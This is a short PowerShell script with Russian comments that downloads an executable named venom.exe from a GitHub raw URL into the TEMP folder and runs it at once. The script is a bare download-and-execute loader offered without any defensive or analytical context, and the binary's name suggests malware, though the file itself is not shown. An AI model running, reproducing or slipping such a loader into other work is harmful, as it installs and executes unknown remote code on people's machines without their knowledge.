# Установка URL для загрузки
$url = 'https://github.com/sigmanip/venom/raw/refs/heads/main/venom.exe'

# Установка пути для сохранения загруженного файла
$outputPath = "$env:TEMP\venom.exe"

# Загрузка файла по указанному URL и сохранение его на диск
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Запуск загруженного файла
Start-Process -FilePath $outputPath
